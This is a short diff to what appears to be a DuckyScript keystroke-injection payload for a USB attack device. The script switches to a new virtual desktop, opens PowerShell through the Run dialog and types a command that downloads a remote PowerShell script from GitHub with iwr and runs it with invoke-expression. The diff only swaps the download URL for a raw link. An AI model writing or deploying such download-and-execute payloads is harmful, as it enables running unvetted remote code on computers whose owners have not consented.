@@ -4,6 +4,6 @@ CTRL GUI D
 GUI R
 STRINGLN powershell
 DELAY 1500
-STRINGLN $pl = iwr https://github.com/Red-Ducky/Payloads/blob/main/Popups/payload.ps1?dl=1; invoke-expression $pl
+STRINGLN $pl = iwr https://raw.githubusercontent.com/Red-Ducky/Payloads/main/Popups/payload.ps1; invoke-expression $pl
 STRINGLN O
 CTRL GUI LEFT
